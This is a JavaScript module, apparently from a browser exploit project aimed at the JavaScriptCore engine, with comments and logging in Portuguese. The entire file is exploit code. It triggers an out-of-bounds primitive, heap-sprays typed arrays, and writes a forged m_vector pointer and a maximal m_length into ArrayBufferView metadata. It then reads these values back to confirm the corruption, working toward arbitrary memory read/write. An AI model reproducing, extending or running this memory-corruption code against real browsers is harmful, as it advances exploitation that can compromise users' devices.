// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const CORRUPTION_OFFSET_TRIGGER = 0x70; // m_length do ABView em 0x58
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF); // m_length = MAX, m_mode = ???

export async function sprayAndInvestigateObjectExposure() {
    const FNAME_SPRAY_INVESTIGATE = "sprayAndFindCorrupted_v20b_UseLeakedVector";
    logS3(`--- Iniciando Investigação (${FNAME_SPRAY_INVESTIGATE}): Usando "Vazamento" como m_vector ---`, "test", FNAME_SPRAY_INVESTIGATE);

    const NUM_SPRAY_OBJECTS = 200;
    const SPRAY_TYPED_ARRAY_ELEMENT_COUNT = 8;
    const FOCUSED_VICTIM_ABVIEW_START_OFFSET = 0x58; // Onde o ArrayBufferView hipotético começa

    // Usando o "vazamento" 0x190a190a_00000000 como m_vector
    // LOW part do m_vector será 0x00000000
    // HIGH part do m_vector será 0x190a190a
    const PLANT_MVECTOR_LOW_PART  = 0x00000000;
    const PLANT_MVECTOR_HIGH_PART = 0x190A190A;
    const PLANTED_MVECTOR = new AdvancedInt64(PLANT_MVECTOR_LOW_PART, PLANT_MVECTOR_HIGH_PART);

    let sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_SPRAY_INVESTIGATE);

        // 1. Heap Spraying
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} objetos Uint32Array(${SPRAY_TYPED_ARRAY_ELEMENT_COUNT})...`, "info", FNAME_SPRAY_INVESTIGATE);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            let arr = new Uint32Array(SPRAY_TYPED_ARRAY_ELEMENT_COUNT);
            arr[0] = (0xFACE0000 | i);
            sprayedVictimObjects.push(arr);
        }
        logS3("Pulverização de Uint32Array concluída.", "info", FNAME_SPRAY_INVESTIGATE);
        await PAUSE_S3(200);

        // 2. Preparar oob_array_buffer_real: Plantar o m_vector desejado
        const m_vector_target_offset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68

        logS3(`Plantando m_vector ${PLANTED_MVECTOR.toString(true)} em oob_buffer[${toHex(m_vector_target_offset)}]`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(m_vector_target_offset, PLANTED_MVECTOR, 8);

        // 3. Acionar a Corrupção Principal (escrever m_length e m_mode)
        const m_length_target_offset = FOCUSED_VICTIM_ABVIEW_START_OFFSET + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x58 + 0x18 = 0x70
                                                                                                                        // (Este é o CORRUPTION_OFFSET_TRIGGER)
        logS3(`Realizando escrita OOB em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (m_length e m_mode) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_SPRAY_INVESTIGATE);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);

        // 4. Fase de Pós-Corrupção: Ler e verificar os metadados escritos no oob_array_buffer_real
        logS3(`FASE 4: Verificando metadados escritos no oob_array_buffer_real para o objeto em ${toHex(FOCUSED_VICTIM_ABVIEW_START_OFFSET)}...`, "info", FNAME_SPRAY_INVESTIGATE);

        let abv_vector_after, abv_length_after, abv_mode_after;
        try {
            abv_vector_after = oob_read_absolute(m_vector_target_offset, 8);
            abv_length_after = oob_read_absolute(m_length_target_offset, 4); // m_length é Uint32
            // m_mode está nos 4 bytes altos do QWORD escrito em CORRUPTION_OFFSET_TRIGGER
            let temp_qword_at_70 = oob_read_absolute(CORRUPTION_OFFSET_TRIGGER, 8);
            abv_mode_after = temp_qword_at_70.high(); // Assumindo que m_mode é a parte alta. Ajuste se necessário.

        } catch(e) {
            logS3(`Erro ao ler metadados de volta: ${e.message}`, "error", FNAME_SPRAY_INVESTIGATE);
        }

        logS3(`    m_vector (@${toHex(m_vector_target_offset)}): ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura"} (Esperado: ${PLANTED_MVECTOR.toString(true)})`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_length (@${toHex(m_length_target_offset)}): ${toHex(abv_length_after)} (Esperado: ${toHex(CORRUPTION_VALUE_TRIGGER.low())})`, "leak", FNAME_SPRAY_INVESTIGATE);
        logS3(`    m_mode   (@${toHex(m_length_target_offset + 4)}): ${toHex(abv_mode_after)} (Esperado: ${toHex(CORRUPTION_VALUE_TRIGGER.high())})`, "leak", FNAME_SPRAY_INVESTIGATE);

        if (isAdvancedInt64Object(abv_vector_after) && abv_vector_after.equals(PLANTED_MVECTOR) &&
            typeof abv_length_after === 'number' && abv_length_after === CORRUPTION_VALUE_TRIGGER.low()) {
            logS3(`    !!!! SUCESSO EM ESCREVER OS METADADOS DESEJADOS NO OOB_ARRAY_BUFFER_REAL !!!!`, "vuln", FNAME_SPRAY_INVESTIGATE);
            document.title = `ShadowCraft: Meta OK in OOB_AB`;

            logS3("    AVISO: A identificação do 'superArray' foi removida.", "warn", FNAME_SPRAY_INVESTIGATE);
            logS3("    Com m_vector não sendo 0, a técnica anterior de identificação não se aplica.", "warn", FNAME_SPRAY_INVESTIGATE);
            logS3(`    O objeto hipotético em 0x58 agora deveria apontar para ${PLANTED_MVECTOR.toString(true)}.`, "info", FNAME_SPRAY_INVESTIGATE);
            logS3("    Sem 'addrof' ou uma primitiva de leitura/escrita absoluta, é difícil verificar para onde isso aponta.", "info", FNAME_SPRAY_INVESTIGATE);

        } else {
            logS3(`    Falha em confirmar os metadados escritos no oob_array_buffer_real como esperado.`, "error", FNAME_SPRAY_INVESTIGATE);
        }
        logS3("INVESTIGAÇÃO COM M_VECTOR ALTERADO CONCLUÍDA.", "test", FNAME_SPRAY_INVESTIGATE);

    } catch (e) {
        logS3(`ERRO CRÍTICO na investigação: ${e.message}`, "critical", FNAME_SPRAY_INVESTIGATE);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_SPRAY_INVESTIGATE);
        document.title = "ShadowCraft c/ LeakedVec FALHOU!";
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- Investigação ${FNAME_SPRAY_INVESTIGATE} Concluída ---`, "test", FNAME_SPRAY_INVESTIGATE);
    }
}
